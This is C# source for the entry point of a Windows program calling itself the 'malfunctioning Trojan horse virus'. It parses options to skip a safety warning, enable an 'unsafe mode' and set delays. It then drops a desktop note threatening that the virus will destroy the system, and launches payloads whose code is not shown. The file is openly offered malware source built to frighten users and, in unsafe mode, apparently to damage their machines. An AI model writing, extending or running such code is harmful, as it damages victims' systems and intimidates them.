using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.IO;
using static MALFUNCTIONING.api;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Diagnostics;

namespace MALFUNCTIONING
{
    internal class Program
    {
        static void Main(string[] args) 
        {
            if (args.Length > 0)
            {
                foreach (var arg in args)
                {
                    var cmd = arg.ToLower();
                    var Match = Regex.Match(cmd, @".help");

                    if (Match.Success)
                    {
                        var help = @"HELP
PROGRAM [PARAMETER]
parameter:
help - display this help message
bypasswarning - bypass the warning message
S:[1-100] - Set the execution time for each payload
EnableUnSafeMode - Enable unsafe mode
IT:[1|1+] - Startup delay time (in seconds)
";
                        MessageBox(IntPtr.Zero, help, "HELP - MALFUNCTIONING.EXE", 0x40/*MB_ICONINFORMATION*/);
                        Environment.Exit(0);
                    }
                    Match = Regex.Match(cmd, @".bypasswarning");
                    if (Match.Success)
                    {
                        Variables.Warning = false;
                    }
                    Match = Regex.Match(cmd, @"s:((?:[1-9]\d?|100))$");
                    if (Match.Success)
                    {
                        int.TryParse(Match.Groups[1].Value, out Variables.seconds);
                    }
                    Match = Regex.Match(cmd, @"enableunsafemode");
                    if (Match.Success)
                    {
                        Variables.UnsafeMode = true;
                    }
                    Match = Regex.Match(cmd, @"it:([1-9]\d*)$");
                    if (Match.Success)
                    {
                        int.TryParse(Match.Groups[1].Value, out var time);
                        Variables.LatentperiodTime = time * 1000; // 设置延迟时间
                    }
                }
            }
            // MessageBox(IntPtr.Zero, $"S:{Variables.seconds} IT:{Variables.LatentperiodTime} EnableUnsafeMode:{Variables.UnsafeMode}","",0);   // 参数调试
            if (Variables.Warning)
            {
                payloads.ShowWarning();
            }
            try
            {
                string file = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\note.txt";
                File.WriteAllText(file,
                    $@"You have been infected by the malfunctioning Trojan horse virus. 
The virus will destroy your system in {Variables.LatentperiodTime / 1000} seconds!" + (Variables.UnsafeMode ? "\nAlso, do not attempt to shut down this program. The consequences will be very serious." : "")
);
                Process.Start(file);
            }
            catch { }
            function.Sleep(Variables.LatentperiodTime);
            execute.Run();
        }
    }
}
